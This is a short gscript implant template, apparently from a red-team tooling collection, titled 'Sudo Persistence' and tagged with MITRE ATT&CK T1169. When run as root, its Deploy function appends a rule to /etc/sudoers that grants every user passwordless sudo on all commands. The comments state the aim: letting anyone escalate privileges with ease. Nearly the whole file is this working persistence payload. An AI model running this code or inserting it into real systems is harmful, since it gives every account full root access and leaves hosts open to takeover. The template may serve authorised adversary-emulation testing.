// Example gscript template
// Title: Sudo Persistence
// Author: ahhh
// Purpose: adds everyone to the sudo group so they can easily priv esc
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1169
// Note: must run implant as root

//priority:100
//timeout:150

//go_import:os/user as user2

function Deploy() {  
    console.log("starting execution of Sudo Persistence");
    // get user homedir
    var user = user2.Current();
    console.log("Our user is: "+user[0].Username);
    if (user[0].Username == "root") {
        var err1 = G.file.AppendFileString("/etc/sudoers", "\nALL ALL=(ALL:ALL) NOPASSWD:ALL\n");
        console.log(Dump(err1));
        //var err2 = G.file.AppendFileString("/etc/sudoers.d/README", "\nALL ALL=(ALL:ALL) NOPASSWD:ALL\n");
        //console.log(err2);
        console.log("Set ALL to be able to sudo on every command");
    } else {
        console.log("Detected a non-root user, this needs to run as root!");
        //Halt();
    }
    console.log("done Sudo Persistence");
    return true; 
  }
  